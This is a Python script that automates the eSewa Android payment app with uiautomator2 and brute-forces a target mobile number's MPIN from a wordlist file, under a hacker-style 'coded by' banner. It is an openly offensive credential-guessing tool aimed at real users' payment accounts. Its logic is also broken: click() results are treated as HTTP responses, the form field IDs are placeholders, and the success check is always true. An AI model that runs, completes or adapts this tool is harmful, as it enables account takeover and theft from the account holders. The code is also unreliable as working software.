import uiautomator2 as u2

# Connect the device
d = u2.connect()

# Launch the app (e.g., eSewa)
d.app_start("com.esewa.android")

# Wait for the app to load
d.wait_activity("com.esewa.android.app.main.MainActivity", timeout=20)

# Perform automated actions
# Example: Click on the login/register button
d(resourceId="com.esewa.android:id/toolbar_login/register").click()

# Wait for some time to allow for manual interaction
input("Perform manual actions and press Enter when ready...")
print('\n--v1.1.3------**[~~@V.CYPHER*~~]/coded by:VICKY**------v1.1.3--\n')

file = open('mpins.txt', 'r')

MobileNumber = input('Enter Mobile Number: ').strip()
print("\nTarget Mobile Number: ", MobileNumber)
print("\nTrying MPIN's from list ...")

i = 0
while True:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 4:
        continue
    print(str(i) + " : " + passw)
    try:
        response = d(resourceId="com.esewa.android:id/toolbar_login/register").click()
        if response.code == 200:
            # You need to complete the form filling with the correct form fields
            d(resourceId="form_field_id_for_mobile_number").set_text(MobileNumber)
            d(resourceId="form_field_id_for_mpin").set_text(passw)
            response = d(resourceId="submit_button_id").click()
            response_data = response.read()
            if 'response_data' or 'Two-factor authentication' in response_data or 'security code' in response_data:
                print('Your mpin is : ', passw)
                break
    except Exception as e:
        print('Error:', e)